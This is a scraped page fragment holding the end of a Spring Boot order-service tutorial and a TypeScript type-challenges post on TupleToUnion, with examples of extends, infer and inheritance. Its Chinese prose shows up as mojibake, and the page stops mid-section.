<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UpdateOrderRequest</span> {
    <span class="hljs-keyword">private</span> String customerName;
    <span class="hljs-keyword">private</span> String customerAddress;
    <span class="hljs-keyword">private</span> List&lt;OrderItem&gt; items;
}
</code></pre>
<h3 data-id="heading-23">6. è¿è¡Œåº”ç”¨</h3>
<ol>
<li><strong>å¯åŠ¨MySQL</strong>ï¼šç¡®ä¿ä½ çš„MySQLæ•°æ®åº“è¿è¡Œåœ¨<code>localhost:3306</code>ã€‚</li>
<li><strong>åˆ›å»ºæ•°æ®åº“</strong>ï¼šåˆ›å»ºä¸€ä¸ªåä¸º<code>mydatabase</code>çš„æ•°æ®åº“ã€‚</li>
<li><strong>å¯åŠ¨MongoDB</strong>ï¼šç¡®ä¿MongoDBæ•°æ®åº“è¿è¡Œåœ¨<code>localhost:27017</code>ã€‚</li>
<li><strong>å¯åŠ¨Spring Bootåº”ç”¨</strong>ï¼šè¿è¡ŒSpring Bootåº”ç”¨ç¨‹åºã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[type-challengesï¼ˆtsç±»å‹ä½“æ“ï¼‰: 10 - å…ƒç»„è½¬åˆé›†]]></title>    <link>https://juejin.cn/post/7600955777316241446</link>    <guid>https://juejin.cn/post/7600955777316241446</guid>    <pubDate>2026-01-30T15:13:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600955777316241446" data-draft-id="7601028900885987374" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="type-challengesï¼ˆtsç±»å‹ä½“æ“ï¼‰: 10 - å…ƒç»„è½¬åˆé›†"/> <meta itemprop="keywords" content="TypeScript"/> <meta itemprop="datePublished" content="2026-01-30T15:13:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="fxss"/> <meta itemprop="url" content="https://juejin.cn/user/3702810892856808"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            type-challengesï¼ˆtsç±»å‹ä½“æ“ï¼‰: 10 - å…ƒç»„è½¬åˆé›†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3702810892856808/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    fxss
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T15:13:53.000Z" title="Fri Jan 30 2026 15:13:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">10 - å…ƒç»„è½¬åˆé›†</h2>
<p>by Anthony Fu (@antfu) #ä¸­ç­‰ #infer #tuple #union</p>
<h3 data-id="heading-1">é¢˜ç›®</h3>
<p>å®ç°æ³›å‹<code>TupleToUnion&lt;T&gt;</code>ï¼Œå®ƒè¿”å›å…ƒç»„æ‰€æœ‰å€¼çš„åˆé›†ã€‚</p>
<p>ä¾‹å¦‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Arr</span> = [<span class="hljs-string">'1'</span>, <span class="hljs-string">'2'</span>, <span class="hljs-string">'3'</span>]

<span class="hljs-keyword">type</span> <span class="hljs-title class_">Test</span> = <span class="hljs-title class_">TupleToUnion</span>&lt;<span class="hljs-title class_">Arr</span>&gt; <span class="hljs-comment">// expected to be '1' | '2' | '3'</span>
</code></pre>
<blockquote>
<p>åœ¨ Github ä¸ŠæŸ¥çœ‹ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2F10%2Fzh-CN" target="_blank" title="https://tsch.js.org/10/zh-CN" ref="nofollow noopener noreferrer">tsch.js.org/10/zh-CN</a></p>
</blockquote>
<h3 data-id="heading-2">ä»£ç </h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">/* _____________ ä½ çš„ä»£ç  _____________ */</span>

<span class="hljs-keyword">type</span> <span class="hljs-title class_">TupleToUnion</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> [infer F, ...infer R] ? F | <span class="hljs-title class_">TupleToUnion</span>&lt;R&gt; : <span class="hljs-built_in">never</span>

</code></pre>
<p>å…³é”®è§£é‡Šï¼š</p>
<ul>
<li><code>T extends [infer F, ...infer R]</code> ç”¨äºåˆ¤æ–­å…ƒç»„æ˜¯å¦ä¸ºç©ºã€‚</li>
<li><code>F | TupleToUnion&lt;R&gt;</code> ç”¨äºé€’å½’å¤„ç†å…ƒç»„çš„å‰©ä½™éƒ¨åˆ†ã€‚</li>
<li><code>never</code> ç”¨äºå¤„ç†ç©ºå…ƒç»„çš„æƒ…å†µã€‚</li>
</ul>
<h3 data-id="heading-3">ç›¸å…³çŸ¥è¯†ç‚¹</h3>
<h4 data-id="heading-4"><code>extends</code></h4>




















<table><thead><tr><th>ä½¿ç”¨ç»´åº¦</th><th>æ ¸å¿ƒä½œç”¨</th><th>ç¤ºä¾‹åœºæ™¯</th></tr></thead><tbody><tr><td>ç±»å‹ç»´åº¦</td><td>åšç±»å‹çº¦æŸæˆ–æ¡ä»¶åˆ¤æ–­ï¼ˆç±»å‹ç¼–ç¨‹æ ¸å¿ƒï¼‰</td><td>é™å®šæ³›å‹èŒƒå›´ã€åˆ¤æ–­ç±»å‹æ˜¯å¦å…¼å®¹ã€æå–ç±»å‹ç‰‡æ®µ</td></tr><tr><td>è¯­æ³•ç»´åº¦</td><td>åšç»§æ‰¿ï¼ˆå¤ç”¨å·²æœ‰ç»“æ„ï¼‰</td><td>æ¥å£ç»§æ‰¿ã€ç±»ç»§æ‰¿</td></tr></tbody></table>
<h5 data-id="heading-5"><code>extends</code> åšç±»å‹çº¦æŸæˆ–æ¡ä»¶åˆ¤æ–­</h5>
<ol>
<li>æ³›å‹çº¦æŸï¼šé™å®šæ³›å‹çš„å–å€¼èŒƒå›´</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// çº¦æŸ T å¿…é¡»æ˜¯ã€Œæ‹¥æœ‰ length å±æ€§ã€çš„ç±»å‹ï¼ˆæ¯”å¦‚ string/æ•°ç»„ï¼‰</span>
<span class="hljs-keyword">function</span> getLength&lt;T <span class="hljs-keyword">extends</span> { <span class="hljs-attr">length</span>: <span class="hljs-built_in">number</span> }&gt;(<span class="hljs-attr">arg</span>: T): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> arg.<span class="hljs-property">length</span>;
}

<span class="hljs-comment">// åˆæ³•è°ƒç”¨ï¼ˆç¬¦åˆçº¦æŸï¼‰</span>
<span class="hljs-title function_">getLength</span>(<span class="hljs-string">"hello"</span>); <span class="hljs-comment">// âœ… string æœ‰ lengthï¼Œè¿”å› 5</span>
<span class="hljs-title function_">getLength</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]); <span class="hljs-comment">// âœ… æ•°ç»„æœ‰ lengthï¼Œè¿”å› 3</span>

<span class="hljs-comment">// éæ³•è°ƒç”¨ï¼ˆè¶…å‡ºçº¦æŸï¼‰</span>
<span class="hljs-title function_">getLength</span>(<span class="hljs-number">123</span>); <span class="hljs-comment">// âŒ æŠ¥é”™ï¼šnumber æ²¡æœ‰ length å±æ€§</span>
</code></pre>
<ol start="2">
<li>æ¡ä»¶ç±»å‹ï¼šç±»å‹ç‰ˆ <strong>ä¸‰å…ƒè¿ç®—ç¬¦</strong></li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// åŸºç¡€ç¤ºä¾‹ï¼šåˆ¤æ–­ç±»å‹æ˜¯å¦ä¸ºå­—ç¬¦ä¸²</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">IsString</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span> ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;

<span class="hljs-keyword">type</span> A = <span class="hljs-title class_">IsString</span>&lt;<span class="hljs-string">"test"</span>&gt;; <span class="hljs-comment">// trueï¼ˆç¬¦åˆï¼‰</span>
<span class="hljs-keyword">type</span> B = <span class="hljs-title class_">IsString</span>&lt;<span class="hljs-number">123</span>&gt;; <span class="hljs-comment">// falseï¼ˆä¸ç¬¦åˆï¼‰</span>
</code></pre>
<p>åˆ†å¸ƒå¼æ¡ä»¶ç±»å‹ï¼ˆè”åˆç±»å‹ä¸“ç”¨ï¼‰: å½“ <code>T</code> æ˜¯è”åˆç±»å‹æ—¶ï¼Œ<code>extends</code> ä¼šè‡ªåŠ¨æ‹†åˆ†è”åˆç±»å‹çš„æ¯ä¸ªæˆå‘˜ï¼Œé€ä¸ªåˆ¤æ–­åå†åˆå¹¶ç»“æœã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Union</span> = <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span> | <span class="hljs-built_in">boolean</span>;

<span class="hljs-comment">// æ‹†åˆ†é€»è¾‘ï¼šstringâ†’stringï¼Œnumberâ†’neverï¼Œbooleanâ†’never â†’ åˆå¹¶ä¸º string</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">OnlyString</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span> ? T : <span class="hljs-built_in">never</span>;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Result</span> = <span class="hljs-title class_">OnlyString</span>&lt;<span class="hljs-title class_">Union</span>&gt;; <span class="hljs-comment">// Result = string</span>
</code></pre>
<p>æ³¨æ„ï¼šåªæœ‰æ³›å‹å‚æ•°æ˜¯ è£¸ç±»å‹ï¼ˆæ²¡æœ‰è¢« []/{} åŒ…è£¹ï¼‰æ—¶ï¼Œæ‰ä¼šè§¦å‘åˆ†å¸ƒå¼åˆ¤æ–­ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// åŒ…è£¹åä¸è§¦å‘åˆ†å¸ƒå¼ï¼Œæ•´ä½“åˆ¤æ–­ [string|number] æ˜¯å¦å…¼å®¹ [string]</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">NoDist</span>&lt;T&gt; = [T] <span class="hljs-keyword">extends</span> [<span class="hljs-built_in">string</span>] ? T : <span class="hljs-built_in">never</span>;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Result2</span> = <span class="hljs-title class_">NoDist</span>&lt;<span class="hljs-title class_">Union</span>&gt;; <span class="hljs-comment">// neverï¼ˆæ•´ä½“ä¸å…¼å®¹ï¼‰</span>
</code></pre>
<ol start="3">
<li>é…åˆ <code>infer</code>ï¼šæå–ç±»å‹ç‰‡æ®µï¼ˆé»„é‡‘ç»„åˆï¼‰</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// æå– Promise çš„è¿”å›å€¼ç±»å‹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">UnwrapPromise</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer V&gt; ? V : T;

<span class="hljs-keyword">type</span> C = <span class="hljs-title class_">UnwrapPromise</span>&lt;<span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt;&gt;; <span class="hljs-comment">// stringï¼ˆæå–æˆåŠŸï¼‰</span>
<span class="hljs-keyword">type</span> D = <span class="hljs-title class_">UnwrapPromise</span>&lt;<span class="hljs-built_in">number</span>&gt;; <span class="hljs-comment">// numberï¼ˆä¸æ»¡è¶³æ¡ä»¶ï¼Œè¿”å›åŸç±»å‹ï¼‰</span>
</code></pre>
<h5 data-id="heading-6"><code>extends</code> åšç»§æ‰¿ï¼ˆå¤ç”¨å·²æœ‰ç»“æ„ï¼‰</h5>
<ol>
<li>æ¥å£ç»§æ‰¿ï¼šå¤ç”¨ + æ‰©å±•å±æ€§</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// åŸºç¡€æ¥å£</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
}

<span class="hljs-comment">// ç»§æ‰¿ Userï¼Œå¹¶æ‰©å±•æ–°å±æ€§</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">role</span>: <span class="hljs-string">"admin"</span> | <span class="hljs-string">"super_admin"</span>; <span class="hljs-comment">// æ–°å¢æƒé™å±æ€§</span>
}

<span class="hljs-comment">// å¿…é¡»åŒ…å«ç»§æ‰¿çš„ + æ‰©å±•çš„æ‰€æœ‰å±æ€§</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">admin</span>: <span class="hljs-title class_">Admin</span> = {
  <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>,
  <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span>,
  <span class="hljs-attr">role</span>: <span class="hljs-string">"admin"</span>
};

<span class="hljs-comment">// å¤šæ¥å£ç»§æ‰¿</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">HasAge</span> { <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>; }
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">User</span>, <span class="hljs-title class_">HasAge</span> {
  <span class="hljs-attr">className</span>: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// åŒæ—¶ç»§æ‰¿ User + HasAge</span>
}
</code></pre>
<ol start="2">
<li>ç±»ç»§æ‰¿ï¼šå¤ç”¨çˆ¶ç±»çš„å±æ€§ / æ–¹æ³•</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }
  <span class="hljs-title function_">sayHi</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>);
  }
}

<span class="hljs-comment">// ç»§æ‰¿ Parent ç±»</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> {
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span>, age: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-variable language_">super</span>(name); <span class="hljs-comment">// å¿…é¡»è°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°ï¼ˆåˆå§‹åŒ–çˆ¶ç±»å±æ€§ï¼‰</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
  }
  <span class="hljs-comment">// é‡å†™çˆ¶ç±»æ–¹æ³•</span>
  <span class="hljs-title function_">sayHi</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// è°ƒç”¨çˆ¶ç±»åŸæ–¹æ³•</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.age}</span> years old`</span>);
  }
}

<span class="hljs-keyword">const</span> child = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>(<span class="hljs-string">"æå››"</span>, <span class="hljs-number">10</span>);
child.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// è¾“å‡ºï¼šHi, æå›› â†’ I'm 10 years old</span>
</code></pre>
<p>è¡¥å……ï¼šç±»å®ç°æ¥å£ç”¨ <code>implements</code>ï¼ˆä¸æ˜¯ <code>extends</code>ï¼‰</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å®šä¹‰æ¥å£ï¼ˆå¥‘çº¦ï¼šè§„å®šå¿…é¡»æœ‰ idã€name å±æ€§ï¼Œä»¥åŠ greet æ–¹æ³•ï¼‰</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-title function_">greet</span>(): <span class="hljs-built_in">void</span>; <span class="hljs-comment">// ä»…å®šä¹‰æ–¹æ³•ç­¾åï¼Œæ— å®ç°</span>
}

<span class="hljs-comment">// ç±»å®ç°æ¥å£ï¼ˆå¿…é¡»ä¸¥æ ¼éµå®ˆå¥‘çº¦ï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Employee</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-comment">// å¿…é¡»å®ç°æ¥å£çš„æ‰€æœ‰å±æ€§</span>
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;

  <span class="hljs-comment">// æ„é€ å‡½æ•°åˆå§‹åŒ–å±æ€§</span>
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">id: <span class="hljs-built_in">number</span>, name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = id;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }

  <span class="hljs-comment">// å¿…é¡»å®ç°æ¥å£çš„ greet æ–¹æ³•ï¼ˆå…·ä½“å®ç°ç”±ç±»è‡ªå·±å®šä¹‰ï¼‰</span>
  <span class="hljs-title function_">greet</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>, ID: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.id}</span>`</span>);
  }
}

<span class="hljs-comment">// å®ä¾‹åŒ–ä½¿ç”¨</span>
<span class="hljs-keyword">const</span> emp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee</span>(<span class="hljs-number">1</span>, <span class="hljs-string">"å¼ ä¸‰"</span>);
emp.<span class="hljs-title function_">greet</span>(); <span class="hljs-comment">// è¾“å‡ºï¼šHi, I'm å¼ ä¸‰, ID: 1</span>


<span class="hljs-comment">// æ¥å£1ï¼šåŸºç¡€ä¿¡æ¯</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Identifiable</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-title function_">getId</span>(): <span class="hljs-built_in">number</span>;
}

<span class="hljs-comment">// æ¥å£2ï¼šå¯æ‰“å°</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Printable</span> {
  <span class="hljs-title function_">printInfo</span>(): <span class="hljs-built_in">void</span>;
}

<span class="hljs-comment">// ç±»åŒæ—¶å®ç°ä¸¤ä¸ªæ¥å£ï¼ˆå¿…é¡»å®ç°æ‰€æœ‰æ¥å£çš„æˆå‘˜ï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Identifiable</span>, <span class="hljs-title class_">Printable</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// ç±»å¯æ‰©å±•æ¥å£å¤–çš„å±æ€§</span>

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">id: <span class="hljs-built_in">number</span>, name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = id;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }

  <span class="hljs-comment">// å®ç° Identifiable çš„æ–¹æ³•</span>
  <span class="hljs-title function_">getId</span>(): <span class="hljs-built_in">number</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span>;
  }

  <span class="hljs-comment">// å®ç° Printable çš„æ–¹æ³•</span>
  <span class="hljs-title function_">printInfo</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Product: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>, ID: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.getId()}</span>`</span>);
  }
}

<span class="hljs-keyword">const</span> product = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>(<span class="hljs-number">100</span>, <span class="hljs-string">"æ‰‹æœº"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(product.<span class="hljs-title function_">getId</span>()); <span class="hljs-comment">// 100</span>
product.<span class="hljs-title function_">printInfo</span>(); <span class="hljs-comment">// Product: æ‰‹æœº, ID: 100</span>
</code></pre>
<h4 data-id="heading-7"><code>infer</code></h4>
<p><code>infer</code> æ˜¯ TypeScript åœ¨æ¡ä»¶ç±»å‹ä¸­æä¾›çš„å…³é”®å­—ï¼Œç”¨äºå£°æ˜ä¸€ä¸ª <strong>å¾…æ¨å¯¼çš„ç±»å‹å˜é‡</strong>ï¼ˆç±»ä¼¼ç»™ç±»å‹èµ·ä¸€ä¸ªä¸´æ—¶åå­—ï¼‰ï¼Œåªèƒ½åœ¨ <code>extends</code> å­å¥ä¸­ä½¿ç”¨ã€‚å®ƒçš„æ ¸å¿ƒä½œç”¨æ˜¯ï¼šä»å·²æœ‰ç±»å‹ä¸­æå– / æ¨å¯¼æˆ‘ä»¬éœ€è¦çš„éƒ¨åˆ†ï¼Œè€Œæ— éœ€æ‰‹åŠ¨ç¡¬ç¼–ç ç±»å‹ã€‚</p>
<p><code>infer</code> å¿…é¡»é…åˆæ¡ä»¶ç±»å‹ä½¿ç”¨ï¼Œè¯­æ³•ç»“æ„å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// åŸºç¡€ç»“æ„ï¼šæ¨å¯¼ T çš„ç±»å‹ä¸º Uï¼Œè‹¥èƒ½æ¨å¯¼åˆ™è¿”å› Uï¼Œå¦åˆ™è¿”å› never</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">InferType</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> infer U ? U : <span class="hljs-built_in">never</span>;

<span class="hljs-keyword">type</span> <span class="hljs-title class_">Example</span> = <span class="hljs-title class_">InferType</span>&lt;<span class="hljs-built_in">string</span>&gt;; <span class="hljs-comment">// Example ç±»å‹ä¸º string</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Example2</span> = <span class="hljs-title class_">InferType</span>&lt;<span class="hljs-built_in">number</span>[]&gt;; <span class="hljs-comment">// Example2 ç±»å‹ä¸º number[]</span>
</code></pre>
<p>é«˜é¢‘ä½¿ç”¨åœºæ™¯:</p>
<h5 data-id="heading-8">1. æå–å‡½æ•°çš„è¿”å›å€¼ç±»å‹</h5>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å®šä¹‰ç±»å‹å·¥å…·ï¼šæå–å‡½æ•°çš„è¿”å›å€¼ç±»å‹</span>
